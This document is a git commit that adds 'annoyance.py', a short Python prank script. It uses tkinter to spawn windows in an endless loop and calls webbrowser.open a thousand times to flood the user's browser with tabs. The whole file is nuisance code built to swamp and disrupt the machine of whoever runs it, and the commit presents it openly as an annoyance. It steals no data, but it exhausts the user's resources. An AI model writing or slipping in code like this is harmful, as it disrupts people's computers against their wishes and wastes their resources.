5d06eefbb46f4a9c56088d29b093268ca33d818d
Ittussarom Retals Mail Ynohtna <52163910+TheTechRobo@users.noreply.github.com>
2020-04-19 20:29:25 -0400

    Create annoyance.py

---
+++ annoyance.py
@@ -0,0 +1,13 @@
+from tkinter import *
+import webbrowser
+a = Tk()
+Label(a, text="HI").pack()
+hi = Toplevel
+while True:
+    hello = hi()
+    df = hi()
+    fdhoifsdofu = hi()
+    fsdiofsudoiuofisdufoiuew89r = hi()
+    for i in range(0, 1000):
+        webbrowser.open("https://hello.ca")
+    a.mainloop()
